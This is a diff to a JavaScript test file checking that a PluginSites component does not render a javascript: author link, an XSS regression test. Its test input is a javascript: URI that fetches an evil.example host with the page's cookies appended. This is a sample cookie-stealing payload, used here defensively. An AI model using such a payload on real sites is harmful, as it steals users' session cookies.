@@ -8,7 +8,7 @@ import { PluginSites } from '../plugin-sites';
 
 /**
  * Mock usePlugin so we can inject controlled plugin data without hitting real
- * API calls.  Each test overrides `mockUsePluginReturnValue` to simulate a
+ * API calls. Each test overrides `mockUsePluginReturnValue` to simulate a
  * different scenario.
  */
 const mockUsePluginReturnValue: Record< string, unknown > = {};
@@ -48,11 +48,8 @@ function setupPlugin( plugin: Record< string, unknown > | null ) {
 
 describe( '<PluginSites> – author link XSS regression', () => {
 	/**
-	 * FAILING TEST (proves the vulnerability exists before the fix):
-	 *
 	 * When a plugin's author_url contains a javascript: URI the rendered
-	 * anchor must NOT carry that URI as its href.  Without sanitisation the
-	 * raw value reaches the DOM, enabling script execution on click.
+	 * anchor must NOT carry that URI as its href.
 	 */
 	test( 'does not render a javascript: href for the author link', () => {
 		const maliciousUrl = "javascript:fetch('https://evil.example/?c='+document.cookie)"; // eslint-disable-line no-script-url
